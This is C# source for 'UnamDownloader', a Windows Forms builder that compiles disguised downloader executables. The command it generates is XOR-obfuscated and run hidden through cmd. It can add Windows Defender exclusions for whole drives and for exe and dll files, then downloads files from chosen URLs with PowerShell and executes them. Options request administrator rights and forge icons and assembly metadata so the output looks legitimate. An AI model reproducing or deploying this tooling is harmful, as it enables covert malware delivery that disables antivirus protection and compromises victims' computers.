using Microsoft.CSharp;
using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace UnamDownloader
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        public Vanity vanity = new Vanity();

        public Builder()
        {
            InitializeComponent();
        }

        public void NativeCompiler(string savePath)
        {
            string currentDirectory = Path.GetDirectoryName(savePath);
            string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";

            string compilerDirectory = Path.Combine(currentDirectory, "Compiler");
            if (!Directory.Exists(compilerDirectory))
            {
                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
                {
                    archive.ExtractToDirectory(compilerDirectory);
                }
                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
                {
                    archive.ExtractToDirectory(compilerDirectory);
                }
            }

            StringBuilder sb = new StringBuilder(Properties.Resources.Program1);

            bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);

            if (buildResource)
            {
                StringBuilder resource = new StringBuilder(Properties.Resources.resource);
                string defs = "";
                if (vanity.checkIcon.Checked)
                {
                    resource.Replace("#ICON", vanity.txtIconPath.Text);
                    defs += " -DDefIcon";
                }
                if (checkAdmin.Checked)
                {
                    System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "administrator.manifest"), Properties.Resources.administrator);
                    defs += " -DDefAdmin";
                }
                if (vanity.checkAssembly.Checked)
                {
                    resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
                    resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
                    resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
                    resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
                    resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
                    resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
                    resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
                    defs += " -DDefAssembly";
                }
                System.IO.File.WriteAllText(Path.Combine(currentDirectory, "resource.rc"), resource.ToString());

                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(compilerDirectory, "MinGW64\\bin\\windres.exe"),
                    Arguments = "--input resource.rc --output resource.o -O coff -F pe-i386 " + defs,
                    WorkingDirectory = currentDirectory,
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
                System.IO.File.Delete(Path.Combine(currentDirectory, "resource.rc"));
                System.IO.File.Delete(Path.Combine(currentDirectory, "administrator.manifest"));
            }

            string key = RandomString(32);
            string command = "cmd " + CreateCommand();
            sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)));
            sb.Replace("#LENGTH", command.Length.ToString());
            sb.Replace("#KEY", key);

            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.Combine(compilerDirectory, "tinycc\\tcc.exe"),
                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (buildResource ? "resource.o" : "") + " -luser32 -m32",
                WorkingDirectory = currentDirectory,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            System.IO.File.Delete(Path.Combine(currentDirectory, "resource.o"));
            System.IO.File.Delete(Path.Combine(currentDirectory, filename));
        }

        public string CreateCommand()
        {
            List<string> downloads = new List<string>();
            List<string> executes = new List<string>();

            int count = listFiles.Items.Count;
            for (int i = 0; i < count; i++)
            {
                File filevar = ((File)listFiles.Items[i]);
                string droplocation = (filevar.comboDropLocation.Text == "Current Directory" ? "($pwd).path" : "$env:" + filevar.comboDropLocation.Text);
                downloads.Add(string.Format(@"powershell ""(New-Object System.Net.WebClient).DownloadFile('{0}', (Join-Path -Path {1} -ChildPath '{2}'))""", filevar.txtDownloadURL.Text, droplocation, filevar.txtFilename.Text));
                if (filevar.toggleExecute.Checked)
                {
                    executes.Add(string.Format(@"powershell ""Start-Process -FilePath (Join-Path -Path {0} -ChildPath '{1}')""", droplocation, filevar.txtFilename.Text));
                }
            }
            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit");
        }

        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
            const int clength = 55;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[random.Next(clength)];
            }
            return new string(buffer);
        }

        public string Cipher(string data, string key)
        {
            var result = new StringBuilder();
            for (int c = 0; c < data.Length; c++)
                result.Append((char)((uint)data[c] ^ key[c % key.Length]));
            return result.ToString();
        }

        private static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            dialog.InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.builder = this;
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamDownloader");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to download before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            if (save.Length > 0)
            {
                NativeCompiler(save);
            }
        }

        private void btnVanity_Click(object sender, EventArgs e)
        {
            vanity.Show();
        }
    }
}
